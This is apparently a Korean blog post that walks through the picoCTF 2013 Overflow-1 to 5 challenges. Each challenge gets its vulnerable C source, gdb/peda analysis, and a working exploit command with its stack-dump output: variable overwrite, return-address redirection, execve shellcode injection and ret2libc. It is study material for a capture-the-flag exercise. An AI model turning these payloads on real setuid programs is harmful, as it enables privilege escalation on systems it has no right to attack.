---
title: "[study] picoctf 2013 overflow series"
layout: post
description: "picoctf2013 문제 풀이"
categories: ctf
tags:  [bof]
date: 2017-06-09 08:00:00
comments: true
---

[write-ups-2013/pico-ctf-2013 at master · ctfs/write-ups-2013](https://github.com/ctfs/write-ups-2013/tree/master/pico-ctf-2013)

입문 CTF 로서 좋은 문제가 많다고 소문난 **PICO CTF 2013**.
그중 Overflow 문제 풀어보자. :)

<!-- more -->


## Overflow-1

### Source

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "dump_stack.h"

void vuln(int tmp, char *str) {
    int win = tmp;
    char buf[64];
    strcpy(buf, str);
    dump_stack((void **) buf, 23, (void **) &tmp);
    printf("win = %d\n", win);
    if (win == 1) {
        execl("/bin/sh", "sh", NULL);
    } else {
        printf("Sorry, you lose.\n");
    }
    exit(0);
}

int main(int argc, char **argv) {
    if (argc != 2) {
        printf("Usage: stack_overwrite [str]\n");
        return 1;
    }

    uid_t euid = geteuid();
    setresuid(euid, euid, euid);
    vuln(0, argv[1]);
    return 0;
}
```


### Exploit

```bash
$ ./overflow1-3948d17028101c40 $(python -c 'print "A"*64 + "\x00\x00\x00\x01"')
-bash: warning: command substitution: ignored null byte in input
Stack dump:
0xffffd214: 0xffffd4ee (second argument)
0xffffd210: 0x00000000 (first argument)
0xffffd20c: 0x0804870f (saved eip)
0xffffd208: 0xffffd238 (saved ebp)
0xffffd204: 0xf7eaf256
0xffffd200: 0x000003e8
0xffffd1fc: 0x00000001
0xffffd1f8: 0x41414141
0xffffd1f4: 0x41414141
0xffffd1f0: 0x41414141
0xffffd1ec: 0x41414141
0xffffd1e8: 0x41414141
0xffffd1e4: 0x41414141
0xffffd1e0: 0x41414141
0xffffd1dc: 0x41414141
0xffffd1d8: 0x41414141
0xffffd1d4: 0x41414141
0xffffd1d0: 0x41414141
0xffffd1cc: 0x41414141
0xffffd1c8: 0x41414141
0xffffd1c4: 0x41414141
0xffffd1c0: 0x41414141
0xffffd1bc: 0x41414141 (beginning of buffer)
win = 1
$ id
uid=1000(tkhwang) gid=1000(tkhwang) groups=1000(tkhwang),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),121(lpadmin),131(sambashare)
$ pwd
/.../ctf/2013/picoctf/overflow1
```


## Overflow-2

### Source 

`win` 변수는 local variable 이 아니라 `vuln()` 함수의 첫 번째 인자.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "dump_stack.h"

void vuln(int win, char *str) {
    char buf[64];
    strcpy(buf, str);
    dump_stack((void **) buf, 23, (void **) &win);
    printf("win = %d\n", win);
    if (win == 1) {
        execl("/bin/sh", "sh", NULL);
    } else {
        printf("Sorry, you lose.\n");
    }
    exit(0);
}

int main(int argc, char **argv) {
    if (argc != 2) {
        printf("Usage: stack_overwrite [str]\n");
        return 1;
    }

    uid_t euid = geteuid();
    setresuid(euid, euid, euid);
    vuln(0, argv[1]);
    return 0;
}
```

```bash
$ ./overflow2-44e63640e033ff2b $(python -c 'print "A"*64 + "\x00\x00\x00\x01"')
-bash: warning: command substitution: ignored null byte in input
Stack dump:
0xffffd218: 0x000003e8
0xffffd214: 0xffffd4ee (second argument)
0xffffd210: 0x00000000 (first argument)

0xffffd20c: 0x0804870b (saved eip)
0xffffd208: 0xffffd238 (saved ebp)
0xffffd204: 0xf7eaf256
0xffffd200: 0x00000001

0xffffd1fc: 0x41414141
0xffffd1f8: 0x41414141
0xffffd1f4: 0x41414141
0xffffd1f0: 0x41414141
0xffffd1ec: 0x41414141
0xffffd1e8: 0x41414141
0xffffd1e4: 0x41414141
0xffffd1e0: 0x41414141
0xffffd1dc: 0x41414141
0xffffd1d8: 0x41414141
0xffffd1d4: 0x41414141
0xffffd1d0: 0x41414141
0xffffd1cc: 0x41414141
0xffffd1c8: 0x41414141
0xffffd1c4: 0x41414141
0xffffd1c0: 0x41414141 (beginning of buffer)
win = 0
Sorry, you lose.
```

### Exploit

```bash
$ ./overflow2-44e63640e033ff2b $(python -c 'print "A"*64 + "BBBB"*4 + "\x00\x00\x00\x01"')
-bash: warning: command substitution: ignored null byte in input
Stack dump:
0xffffd208: 0x000003e8
0xffffd204: 0xffffd4de (second argument)
0xffffd200: 0x00000001 (first argument)

0xffffd1fc: 0x42424242 (saved eip)
0xffffd1f8: 0x42424242 (saved ebp)
0xffffd1f4: 0x42424242
0xffffd1f0: 0x42424242

0xffffd1ec: 0x41414141
0xffffd1e8: 0x41414141
0xffffd1e4: 0x41414141
0xffffd1e0: 0x41414141
0xffffd1dc: 0x41414141
0xffffd1d8: 0x41414141
0xffffd1d4: 0x41414141
0xffffd1d0: 0x41414141
0xffffd1cc: 0x41414141
0xffffd1c8: 0x41414141
0xffffd1c4: 0x41414141
0xffffd1c0: 0x41414141
0xffffd1bc: 0x41414141
0xffffd1b8: 0x41414141
0xffffd1b4: 0x41414141
0xffffd1b0: 0x41414141 (beginning of buffer)
win = 1
$ id
uid=1000(tkhwang) gid=1000(tkhwang) groups=1000(tkhwang),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),121(lpadmin),131(sambashare)
```

## Overflow-3

### Source

```c
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "dump_stack.h"

/*
 * Goal: Get the program to run this function.
 */
void shell(void) {
    execl("/bin/sh", "sh", NULL);
}

void vuln(char *str) {
    char buf[64];
    strcpy(buf, str);
    dump_stack((void **) buf, 21, (void **) &str);
}

int main(int argc, char **argv) {
    if (argc != 2) {
        printf("Usage: buffer_overflow [str]\n");
        return 1;
    }

    uid_t euid = geteuid();
    setresuid(euid, euid, euid);
    printf("shell function = %p\n", shell);
    vuln(argv[1]);
    return 0;
}
```

### Analysis

```
0x61616174 in ?? ()
gef>  pattern search 0x61616174
[+] Searching '0x61616174'
[+] Found at offset 76 (little-endian search) likely
[+] Found at offset 73 (big-endian search)

gef> p  shell
$1 = {void (void)} 0x80485f8 <shell>
```


### Exploit

```bash
$ ./overflow3-28d8a442fb232c0c $(python -c 'print "A"*76 + "\xf8\x85\x04\x08"')
shell function = 0x80485f8
Stack dump:
0xffffd200: 0xffffd400 (first argument)
0xffffd1fc: 0x080485f8 (saved eip)
0xffffd1f8: 0x41414141 (saved ebp)
0xffffd1f4: 0x41414141
0xffffd1f0: 0x41414141
0xffffd1ec: 0x41414141
0xffffd1e8: 0x41414141
0xffffd1e4: 0x41414141
0xffffd1e0: 0x41414141
0xffffd1dc: 0x41414141
0xffffd1d8: 0x41414141
0xffffd1d4: 0x41414141
0xffffd1d0: 0x41414141
0xffffd1cc: 0x41414141
0xffffd1c8: 0x41414141
0xffffd1c4: 0x41414141
0xffffd1c0: 0x41414141
0xffffd1bc: 0x41414141
0xffffd1b8: 0x41414141
0xffffd1b4: 0x41414141
0xffffd1b0: 0x41414141 (beginning of buffer)
$ id
uid=1000(tkhwang) gid=1000(tkhwang) groups=1000(tkhwang),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),121(lpadmin),131(sambashare)
```

## Overflow-4

### Source

```c
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "dump_stack.h"

/*
 * Goal: Get the program to run a shell.
 */

void vuln(char *str) {
    char buf[64];
    strcpy(buf, str);
    dump_stack((void **) buf, 21, (void **) &str);
}

int main(int argc, char **argv) {
    if (argc != 2) {
        printf("Usage: buffer_overflow_shellcode [str]\n");
        return 1;
    }

    uid_t euid = geteuid();
    setresuid(euid, euid, euid);
    vuln(argv[1]);
    return 0;
}
```


### Analysis

```
pwndbg> checksec
[*] '/.../ctf/2013/picoctf/overflow4/overflow4-4834efeff17abdfb'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

Buffer size 는 76 bytes.

```
$ ./pattern.py 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

$ ./pattern.py 0x63413563
Pattern 0x63413563 first occurrence at position 76 in pattern.
```


peda 의 shellcode 기능을 이용해보자.

- `shellcode search x86`
- `shellcode display 811`

```bash
$ shellcode search x86
Connecting to shell-storm.org...
Found 342 shellcodes
ScId    Title
...
[811]   Linux/x86 - execve(/bin/sh) - 28 bytes

gdb-peda$ shellcode display 811
Connecting to shell-storm.org...

/*
Title:  Linux x86 execve("/bin/sh") - 28 bytes
Author: Jean Pascal Pereira <pereira@secbiz.de>
Web:    http://0xffe4.org


Disassembly of section .text:

08048060 <_start>:
 8048060: 31 c0                 xor    %eax,%eax
 8048062: 50                    push   %eax
 8048063: 68 2f 2f 73 68        push   $0x68732f2f
 8048068: 68 2f 62 69 6e        push   $0x6e69622f
 804806d: 89 e3                 mov    %esp,%ebx
 804806f: 89 c1                 mov    %eax,%ecx
 8048071: 89 c2                 mov    %eax,%edx
 8048073: b0 0b                 mov    $0xb,%al
 8048075: cd 80                 int    $0x80
 8048077: 31 c0                 xor    %eax,%eax
 8048079: 40                    inc    %eax
 804807a: cd 80                 int    $0x80



*/

#include <stdio.h>

char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73"
                   "\x68\x68\x2f\x62\x69\x6e\x89"
                   "\xe3\x89\xc1\x89\xc2\xb0\x0b"
                   "\xcd\x80\x31\xc0\x40\xcd\x80";

int main()
{
  fprintf(stdout,"Lenght: %d\n",strlen(shellcode));
  (*(void  (*)()) shellcode)();
}
```


### Exploit

```
$ ./overflow4-4834efeff17abdfb "$(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A"*(76-28) + "\xd0\xed\xff\xbf"')"
Stack dump:
0xbfffee20: 0xbffff100 (first argument)
0xbfffee1c: 0xbfffedd0 (saved eip)
0xbfffee18: 0x41414141 (saved ebp)
0xbfffee14: 0x41414141
0xbfffee10: 0x41414141
0xbfffee0c: 0x41414141
0xbfffee08: 0x41414141
0xbfffee04: 0x41414141
0xbfffee00: 0x41414141
0xbfffedfc: 0x41414141
0xbfffedf8: 0x41414141
0xbfffedf4: 0x41414141
0xbfffedf0: 0x41414141
0xbfffedec: 0x41414141
0xbfffede8: 0x80cd40c0
0xbfffede4: 0x3180cd0b
0xbfffede0: 0xb0c289c1
0xbfffeddc: 0x89e3896e
0xbfffedd8: 0x69622f68
0xbfffedd4: 0x68732f2f
0xbfffedd0: 0x6850c031 (beginning of buffer)
$ id
uid=1000(tkhwang) gid=1000(tkhwang) groups=1000(tkhwang),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
```


## Overflow-5

### Analysis

NX bit 가 있으므로 shellcode injection 을 안 되고, ROP 를 써야겠다.

```bash
$ checksec ./overflow5-0353c1a83cb2fa0d
[*] '/.../ctf/2013/picoctf/overflow5/overflow5-0353c1a83cb2fa0d'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```


Buf size 는 `1036` bytes.

```
0x41296e41 in ?? ()
gdb-peda$ pattern search 0x41296e41
Registers contain pattern buffer:
EIP+0 found at offset: 1036
Registers point to pattern buffer:
[EBP] --> offset 1064 - size ~203
[EDX] --> offset 1486 - size ~14
[ECX] --> offset 1486 - size ~14
[ESP] --> offset 1040 - size ~203
[EAX] --> offset 0 - size ~203
Pattern buffer found at:
0xffffc7d0 : offset    0 - size 1500 ($sp + -0x410 [-260 dwords])
0xffffcf02 : offset    0 - size 1500 ($sp + 0x322 [200 dwords])
0xffffdba4 : offset 37729 - size    4 ($sp + 0xfc4 [1009 dwords])
References to pattern buffer found at:
0xffffc7b0 : 0xffffc7d0 ($sp + -0x430 [-268 dwords])
0xffffc7c0 : 0xffffc7d0 ($sp + -0x420 [-264 dwords])
0xffffc7c4 : 0xffffcf02 ($sp + -0x41c [-263 dwords])
```


```
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0xf7e37060 <__libc_system>

gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xf7f5b84f ("/bin/sh")
```


### Exploit

```bash
$ ./overflow5-0353c1a83cb2fa0d "$(python -c 'print "A"*1036 + "\x60\x70\xe3\xf7" + "BBBB" + "\x4f\xb8\xf5\xf7"')"
$ id
uid=1000(tkhwang) gid=1000(tkhwang) groups=1000(tkhwang),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),121(lpadmin),131(sambashare)
```







